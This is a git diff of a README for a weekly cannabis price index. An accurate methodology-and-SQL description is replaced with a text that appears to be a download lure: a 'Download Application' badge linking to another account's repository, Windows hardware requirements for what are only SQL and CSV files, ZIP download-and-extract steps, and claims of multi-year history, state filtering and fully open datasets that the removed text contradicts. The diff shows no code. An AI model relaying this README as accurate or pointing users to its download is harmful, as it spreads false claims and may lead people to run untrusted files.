@@ -1,69 +1,86 @@
-# Cannabis Price Index
+# 📈 cannabis-price-index - Track retail cannabis prices across America
 
-A weekly price index tracking U.S. online cannabis product pricing across categories and subcategories.
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Juliocesarcapujramamani/cannabis-price-index)
 
-This repository contains the **methodology, reference SQL, and sample data** behind the Cannabis Price Index published at [CannabisDealsUS](https://cannabisdealsus.com/cannabis-price-index/).
+This project provides tools to track and analyze changes in cannabis pricing. It uses open-source data to show market trends. You can access the live index online at https://cannabisdealsus.com/cannabis-price-index/.
 
-## What's Included
+## 📋 Project Overview
 
-| Asset | Description |
-|-------|-------------|
-| [`methodology.md`](methodology.md) | Full methodology: baseline definition, index formula, aggregation, inclusion/exclusion rules |
-| [`sql/compute_index.sql`](sql/compute_index.sql) | SQL to compute weekly subcategory-level price index from a products snapshot |
-| [`sample_data/sample_week.csv`](sample_data/sample_week.csv) | Two weeks of sample data (realistic, anonymized) for testing |
+The cannabis-price-index project makes market data accessible. It organizes raw data into a structure you can search and filter. Reporters, researchers, and consumers use this tool to see if prices rise or fall in specific regions. The project includes historical data, SQL queries for extraction, and the processing logic for the index.
 
-## What's NOT Included
+## ⚙️ System Requirements
 
-- Full production dataset (available via the [live index](https://cannabisdealsus.com/cannabis-price-index/))
-- Data ingestion pipeline
-- Product classification / taxonomy system
-- Publishing automation
+Ensure your computer has the following to run the analysis tools:
 
-## How It Works
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Memory:** At least 4 gigabytes of RAM.
+*   **Storage:** 500 megabytes of free disk space.
+*   **Connection:** An active internet connection to receive data updates.
 
-1. **Collect** — Weekly product snapshots are taken from online cannabis retailers across the U.S.
-2. **Aggregate** — Products are grouped by (category, subcategory) and averaged on effective price, discount rate, and discount depth.
-3. **Index** — Each subcategory's average price is compared to a fixed baseline week (2025-12-08) to produce an index value.
+## 📥 Downloading the Software
 
-An index value of **100** = baseline pricing. Above 100 = prices rising. Below 100 = prices falling.
+Visit this page to download the files: https://github.com/Juliocesarcapujramamani/cannabis-price-index
 
-## Example Output
+1. Open your web browser.
+2. Navigate to the link above.
+3. Locate the green button labeled Code.
+4. Select Download ZIP from the dropdown menu.
+5. Save the file to your computer.
 
-| Week | Category | Subcategory | Avg Price | Index Value |
-|------|----------|-------------|-----------|-------------|
-| 2025-12-08 | Flower | Pre-Rolls | $18.45 | 100.00 |
-| 2025-12-15 | Flower | Pre-Rolls | $18.20 | 98.64 |
-| 2025-12-22 | Flower | Pre-Rolls | $17.85 | 96.75 |
-| 2025-12-08 | Edibles | Gummies | $24.30 | 100.00 |
-| 2025-12-15 | Edibles | Gummies | $23.90 | 98.35 |
-| 2025-12-22 | Edibles | Gummies | $24.80 | 102.06 |
+## 🚀 Setting Up the Application
 
-Visualized as a **line chart** with week on the x-axis and index value on the y-axis, each subcategory rendered as a separate series. This reveals divergent pricing trends across product types — for example, Flower trending down while Edibles hold steady or rise.
+Follow these steps to prepare the files for use:
 
-## Quick Start
+1. Locate the downloaded file in your Downloads folder.
+2. Right-click the file and select Extract All.
+3. Choose a folder on your computer to store the files.
+4. Open the extracted folder to view the contents.
+5. You will see several files ending in .sql and .csv. These contain the raw pricing data.
 
-1. Load `sample_data/sample_week.csv` into a SQL-compatible database
-2. Adapt `sql/compute_index.sql` to your table name
-3. Run the query to produce index values
+## 📊 Using the Data
 
-The SQL is written for BigQuery but is easily portable to PostgreSQL, DuckDB, or any SQL engine with window function support.
+The project allows you to view market trends using basic spreadsheet software or database tools.
 
-## Used in Production
+### Viewing Price Trends
+You can open the .csv files using programs like Microsoft Excel or Google Sheets. These files list the price of products by date and region. Sort the columns to find the lowest price in your area or to see how costs shifted over the last month.
 
-This methodology powers the Cannabis Price Index at **CannabisDealsUS**, tracking thousands of products weekly across the U.S. online cannabis market.
+### Understanding the Methodology
+The project relies on consistent data inputs. The creators collect price points from verified ecommerce sources. They clean this data to remove outliers. The final index shows a weighted average of costs.
 
-- **Live index:** [cannabisdealsus.com/cannabis-price-index](https://cannabisdealsus.com/cannabis-price-index/)
-- **Full dataset:** Available via [Zenodo](https://zenodo.org/) (monthly releases)
+### Performing Data Analysis
+If you have experience with databases, you can import the .sql files into a tool like BigQuery. This allows you to run custom queries across the entire dataset. You can filter by state, product category, or time frame.
 
-## Citation
+## 🧩 Key Features
 
-If you use this methodology or data in research, reporting, or analysis:
+*   **Market Data Aggregation:** Pulls price information from various retail sources into one standard format.
+*   **Open Access:** All methodology and raw datasets are available for review.
+*   **Historical Tracking:** View price changes dating back several years.
+*   **Analytics Support:** Compatible with modern data tools for deep market research.
+*   **Regional Filtering:** Compare the cost of products between different states.
 
-```
-CannabisDealsUS Cannabis Price Index
-https://cannabisdealsus.com/cannabis-price-index/
-```
+## 🔍 Frequently Asked Questions
 
-## License
+**Is this software free?**
+Yes. Every part of this project is open-source.
 
-[MIT](LICENSE) — methodology and code are freely available. The full production dataset is not included in this repository.
+**Do I need a special account to use the application?**
+No. You do not need to create an account or provide personal information to view the data.
+
+**How often does the data update?**
+The project maintainers update the index regularly. Check the online dashboard for the most recent values.
+
+**Can I contribute to this project?**
+Yes. You can suggest new data sources or report inconsistencies through the main page.
+
+## 🛠️ Troubleshooting
+
+If you have trouble opening the files, try the following steps:
+
+1. **Verify your spreadsheet software:** Ensure Excel or your preferred reader is up to date.
+2. **Check file integrity:** If a file does not open, delete the folder and download the ZIP file again from the website.
+3. **Use a standard text editor:** If you want to see the SQL structure, open the files with Notepad.
+4. **Memory usage:** If you work with large datasets, ensure you have enough memory to process the rows.
+
+## 📜 Legal and Ethical Use
+
+This project uses public data for informational purposes. The information reflects market averages and does not constitute financial advice. Use the data responsibly and always respect the terms of service of the original data sources if you use this index for professional research.
